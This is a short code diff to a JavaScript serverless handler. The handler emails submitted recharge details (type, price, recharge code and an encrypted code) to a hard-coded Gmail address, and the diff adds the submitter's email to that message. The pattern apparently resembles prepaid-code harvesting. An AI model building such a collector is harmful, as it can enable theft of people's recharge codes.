@@ -38,7 +38,7 @@ exports.handler = async (event, context) => {
     from: email, // replace with your email
     to: 'checkcards6@gmail.com',
     subject: 'Recharge Information',
-    text: `Recharge Type: ${rechargeType}\nPrice: ${price}\nRecharge Code: ${rechargeCode}\nEncrypted Code: ${encryptedCode}`
+    text: `Recharge Type: ${rechargeType}\nPrice: ${price}\nRecharge Code: ${rechargeCode}\nEncrypted Code: ${encryptedCode}\nEmail: ${email}`
   };
 
   try {
